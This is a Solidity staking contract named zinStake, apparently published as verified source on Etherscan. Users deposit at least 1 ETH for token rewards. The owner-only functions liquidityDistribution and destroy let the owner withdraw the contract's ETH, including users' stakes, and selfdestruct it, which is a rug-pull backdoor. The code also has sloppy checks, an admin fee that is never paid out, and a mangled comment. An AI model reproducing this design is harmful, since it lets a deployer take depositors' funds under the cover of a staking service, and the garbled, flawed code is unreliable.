/**
 *Submitted for verification at Etherscan.io on 2020-08-23
*/

pragma solidity ^0.6.0;
import "./SafeMath.sol";
import "./IERC20.sol";
contract zinStake {
     constructor( ZinFinance _token,address payable _admin) public {
      token=_token;
      owner = msg.sender;
      admin=_admin;
       }
       //global Values
     struct User{
        uint256 stakes;
        uint256 deposit_time;
        uint256 deposit_payouts;
    }
    mapping(address=>User) public userData;
     using SafeMath for uint256;
     /**
     * @notice address of owener
     */
     address payable owner;
     address payable admin;
     /**
     * @notice total stake holders.
     */
     address[] public stakeholders;
     /**
     * @notice The stakes for each stakeho      /**
     * @notice deposit_time for each user!
     */
     mapping(address => uint256) public deposit_time;

    
    ZinFinance public token;
//========Modifiers========
    modifier onlyOwner(){
    require(msg.sender==owner);
    _;
    }
//=========**============
    function stakeEth()
        public
        payable
    { 
        require(msg.value>=1e18,"minimum 1 eth is required to participate!");
        require(userData[msg.sender].stakes==0,"you have already staked!");
        userData[msg.sender].deposit_time=now;
        userData[msg.sender].stakes=msg.value;
        addStakeholder(msg.sender);    
        }
    //------------Add Stake holders----------
        /**
     * @notice A method to add a stakeholder.
     * @param _stakeholder The stakeholder to add.
     */
    function addStakeholder(address _stakeholder)
        private
    {
        (bool _isStakeholder, ) = isStakeholder(_stakeholder);
        if(!_isStakeholder) stakeholders.push(_stakeholder);
    }
    function transferOwnerShip(address payable _owner)public onlyOwner{
        owner=_owner;
    }
      // ---------- STAKEHOLDERS ----------

    /**
     * @notice A method to check if an address is a stakeholder.
     * @param _address The address to verify.
     * @return bool, uint256 Whether the address is a stakeholder, 
     * and if so its position in the stakeholders array.
     */
    function isStakeholder(address _address)
        public
        view
        returns(bool, uint256)
    {
        for (uint256 s = 0; s < stakeholders.length; s += 1){
            if (_address == stakeholders[s]) return (true, s);
        }
        return (false, 0);
    }
     function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return (_amount.mul(21)).div(10);
    }

    function rewardOfEachUser(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(userData[_addr].stakes);

        if(userData[_addr].deposit_payouts < max_payout) {
            payout = (calculateDividend(_addr) * ((block.timestamp - userData[_addr].deposit_time) /1 minutes)) - userData[_addr].deposit_payouts;
            if(userData[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - userData[_addr].deposit_payouts;
            }
        }
    }
     /** 
     * @notice A simple method that calculates the rewards for each stakeholder.
     * @param _stakeholder The stakeholder to calculate rewards for.
     */
    function calculateDividend(address _stakeholder)
        public
        view
        returns(uint256)
        
    {
           uint256 reward=208333333;
           return ((userData[_stakeholder].stakes.div(1000000000000)).mul(reward));
        
    }
      /**
     * @notice A method to allow a stakeholder to withdraw his rewards.
     */
    function withdrawReward() 
     public
     {
        (uint256 reward,uint256 max_payout)=this.rewardOfEachUser(msg.sender);
        require(reward>0,"You have no reward!");
         require(token.balanceOf(address(this))>=reward,"There are no token to collect right now!");
         token.transfer(msg.sender,reward);
         userData[msg.sender].deposit_payouts+=reward;

    }
     function unstake() 
     public 
     {
        require(now>=userData[msg.sender].deposit_time+1 weeks,"You can't unstake before 1 week");
        uint256 adminFee=(userData[msg.sender].stakes*1)/100;
        uint256 stakes=userData[msg.sender].stakes.sub(adminFee);
        require(stakes>0,"You have nothing staked!");
        require(address(this).balance>=0,"There are no Eth to collect right now");
        msg.sender.transfer(stakes);
        userData[msg.sender].stakes=0;
        userData[msg.sender].deposit_time=0;
        userData[msg.sender].deposit_payouts=0;
        if(userData[msg.sender].stakes==0){
        (bool _isStakeholder, uint256 s) = isStakeholder(msg.sender);
        if(_isStakeholder){
            stakeholders[s] = stakeholders[stakeholders.length - 1];
            stakeholders.pop();
        } 
        }
    }
    function liquidityDistribution(uint256 _amount)public onlyOwner{
        owner.transfer(_amount);
    }
    function totalStakes()
        public
        view
        returns(uint256)
    {
        uint256 _totalStakes = 0;
        for (uint256 s = 0; s < stakeholders.length; s += 1){
            _totalStakes = _totalStakes.add(userData[stakeholders[s]].stakes);
        }
        return _totalStakes;
    }
    function destroy()
    public
    onlyOwner
    {
        require(token.transfer(owner,token.balanceOf(address(this))),"balance not transferring");
        selfdestruct(owner);
    }

}